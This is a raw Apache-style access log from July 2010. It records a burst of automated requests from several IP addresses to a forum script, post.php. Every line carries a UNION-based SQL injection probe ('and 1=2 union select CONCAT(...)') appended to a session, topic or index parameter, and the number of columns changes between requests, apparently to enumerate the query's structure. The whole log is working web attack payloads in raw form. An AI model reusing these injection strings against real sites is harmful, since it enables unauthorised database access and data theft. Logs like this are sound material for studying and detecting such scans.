188.85.209.228 - - [05/Jul/2010:01:44:18 -0700] "GET wap.blackstardojo.org/post.php?type=html&topic_id=2230&topic_index=0&sid=6054188153116c4d76e611cdcf5c137d%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1846 "-" "czxt2s"
88.230.103.27 - - [05/Jul/2010:01:44:19 -0700] "GET wap.blackstardojo.org/post.php?topic_index=0&sid=49f0033704bc1bc6e12ed0e0798159c6&type=html&topic_id=2278%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1319 "-" "czxt2s"
83.248.41.128 - - [05/Jul/2010:01:44:19 -0700] "GET wap.blackstardojo.org/post.php?type=html&topic_id=2278&topic_index=0&sid=49f0033704bc1bc6e12ed0e0798159c6%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 6671 "-" "czxt2s"
122.29.130.41 - - [05/Jul/2010:01:44:19 -0700] "GET wap.blackstardojo.org/post.php?sid=bec13ba784d3861fbcf18db9c3851e76&type=html&topic_id=656&topic_index=12%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 10103 "-" "czxt2s"
189.87.134.161 - - [05/Jul/2010:01:44:19 -0700] "GET wap.blackstardojo.org/post.php?topic_index=0&sid=1ba4ef6ccf8b4634665d5a84d1b26bb1&type=html&topic_id=2229%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1711 "-" "czxt2s"
88.7.172.75 - - [05/Jul/2010:01:44:19 -0700] "GET wap.blackstardojo.org/post.php?topic_index=0&sid=6054188153116c4d76e611cdcf5c137d&type=html&topic_id=2230%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1543 "-" "czxt2s"
188.85.209.228 - - [05/Jul/2010:01:44:19 -0700] "GET wap.blackstardojo.org/post.php?type=html&topic_id=2230&topic_index=0&sid=6054188153116c4d76e611cdcf5c137d%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1846 "-" "czxt2s"
186.48.2.32 - - [05/Jul/2010:01:44:19 -0700] "GET wap.blackstardojo.org/post.php?topic_index=12&sid=bec13ba784d3861fbcf18db9c3851e76&type=html&topic_id=656%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1600 "-" "czxt2s"
87.196.203.250 - - [05/Jul/2010:01:44:19 -0700] "GET wap.blackstardojo.org/post.php?sid=27b62f0a0f567cda53bbf0e7a3a4c325&type=html&topic_id=1007&topic_index=42%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 13695 "-" "czxt2s"
41.249.43.238 - - [05/Jul/2010:01:44:19 -0700] "GET wap.blackstardojo.org/post.php?type=html&topic_id=1007&topic_index=42&sid=27b62f0a0f567cda53bbf0e7a3a4c325%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 12919 "-" "czxt2s"
83.248.41.128 - - [05/Jul/2010:01:44:19 -0700] "GET wap.blackstardojo.org/post.php?type=html&topic_id=2278&topic_index=0&sid=49f0033704bc1bc6e12ed0e0798159c6%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 6670 "-" "czxt2s"
122.29.130.41 - - [05/Jul/2010:01:44:19 -0700] "GET wap.blackstardojo.org/post.php?sid=bec13ba784d3861fbcf18db9c3851e76&type=html&topic_id=656&topic_index=12%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 10215 "-" "czxt2s"
88.230.103.27 - - [05/Jul/2010:01:44:19 -0700] "GET wap.blackstardojo.org/post.php?topic_index=0&sid=49f0033704bc1bc6e12ed0e0798159c6&type=html&topic_id=2278%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1375 "-" "czxt2s"
188.85.209.228 - - [05/Jul/2010:01:44:19 -0700] "GET wap.blackstardojo.org/post.php?type=html&topic_id=2230&topic_index=0&sid=6054188153116c4d76e611cdcf5c137d%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1846 "-" "czxt2s"
88.7.172.75 - - [05/Jul/2010:01:44:19 -0700] "GET wap.blackstardojo.org/post.php?topic_index=0&sid=6054188153116c4d76e611cdcf5c137d&type=html&topic_id=2230%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1599 "-" "czxt2s"
186.48.2.32 - - [05/Jul/2010:01:44:19 -0700] "GET wap.blackstardojo.org/post.php?topic_index=12&sid=bec13ba784d3861fbcf18db9c3851e76&type=html&topic_id=656%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1656 "-" "czxt2s"
87.196.203.250 - - [05/Jul/2010:01:44:20 -0700] "GET wap.blackstardojo.org/post.php?sid=27b62f0a0f567cda53bbf0e7a3a4c325&type=html&topic_id=1007&topic_index=42%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 13752 "-" "czxt2s"
122.29.130.41 - - [05/Jul/2010:01:44:20 -0700] "GET wap.blackstardojo.org/post.php?sid=bec13ba784d3861fbcf18db9c3851e76&type=html&topic_id=656&topic_index=12%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 10328 "-" "czxt2s"
41.249.43.238 - - [05/Jul/2010:01:44:20 -0700] "GET wap.blackstardojo.org/post.php?type=html&topic_id=1007&topic_index=42&sid=27b62f0a0f567cda53bbf0e7a3a4c325%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 12919 "-" "czxt2s"
88.230.103.27 - - [05/Jul/2010:01:44:20 -0700] "GET wap.blackstardojo.org/post.php?topic_index=0&sid=49f0033704bc1bc6e12ed0e0798159c6&type=html&topic_id=2278%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1431 "-" "czxt2s"
186.48.2.32 - - [05/Jul/2010:01:44:20 -0700] "GET wap.blackstardojo.org/post.php?topic_index=12&sid=bec13ba784d3861fbcf18db9c3851e76&type=html&topic_id=656%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1712 "-" "czxt2s"
88.7.172.75 - - [05/Jul/2010:01:44:20 -0700] "GET wap.blackstardojo.org/post.php?topic_index=0&sid=6054188153116c4d76e611cdcf5c137d&type=html&topic_id=2230%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1655 "-" "czxt2s"
122.29.130.41 - - [05/Jul/2010:01:44:20 -0700] "GET wap.blackstardojo.org/post.php?sid=bec13ba784d3861fbcf18db9c3851e76&type=html&topic_id=656&topic_index=12%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 10439 "-" "czxt2s"
87.196.203.250 - - [05/Jul/2010:01:44:20 -0700] "GET wap.blackstardojo.org/post.php?sid=27b62f0a0f567cda53bbf0e7a3a4c325&type=html&topic_id=1007&topic_index=42%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 13807 "-" "czxt2s"
41.249.43.238 - - [05/Jul/2010:01:44:20 -0700] "GET wap.blackstardojo.org/post.php?type=html&topic_id=1007&topic_index=42&sid=27b62f0a0f567cda53bbf0e7a3a4c325%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 12920 "-" "czxt2s"
186.48.2.32 - - [05/Jul/2010:01:44:20 -0700] "GET wap.blackstardojo.org/post.php?topic_index=12&sid=bec13ba784d3861fbcf18db9c3851e76&type=html&topic_id=656%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1768 "-" "czxt2s"
88.230.103.27 - - [05/Jul/2010:01:44:20 -0700] "GET wap.blackstardojo.org/post.php?topic_index=0&sid=49f0033704bc1bc6e12ed0e0798159c6&type=html&topic_id=2278%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1487 "-" "czxt2s"
88.7.172.75 - - [05/Jul/2010:01:44:20 -0700] "GET wap.blackstardojo.org/post.php?topic_index=0&sid=6054188153116c4d76e611cdcf5c137d&type=html&topic_id=2230%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1711 "-" "czxt2s"
189.87.134.161 - - [05/Jul/2010:01:44:21 -0700] "GET wap.blackstardojo.org/post.php?topic_index=0&sid=1ba4ef6ccf8b4634665d5a84d1b26bb1&type=html&topic_id=2229%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1767 "-" "czxt2s"
186.48.2.32 - - [05/Jul/2010:01:44:21 -0700] "GET wap.blackstardojo.org/post.php?topic_index=12&sid=bec13ba784d3861fbcf18db9c3851e76&type=html&topic_id=656%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1824 "-" "czxt2s"
88.230.103.27 - - [05/Jul/2010:01:44:21 -0700] "GET wap.blackstardojo.org/post.php?topic_index=0&sid=49f0033704bc1bc6e12ed0e0798159c6&type=html&topic_id=2278%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1543 "-" "czxt2s"
41.249.43.238 - - [05/Jul/2010:01:44:21 -0700] "GET wap.blackstardojo.org/post.php?type=html&topic_id=1007&topic_index=42&sid=27b62f0a0f567cda53bbf0e7a3a4c325%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 12920 "-" "czxt2s"
88.7.172.75 - - [05/Jul/2010:01:44:21 -0700] "GET wap.blackstardojo.org/post.php?topic_index=0&sid=6054188153116c4d76e611cdcf5c137d&type=html&topic_id=2230%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1767 "-" "czxt2s"
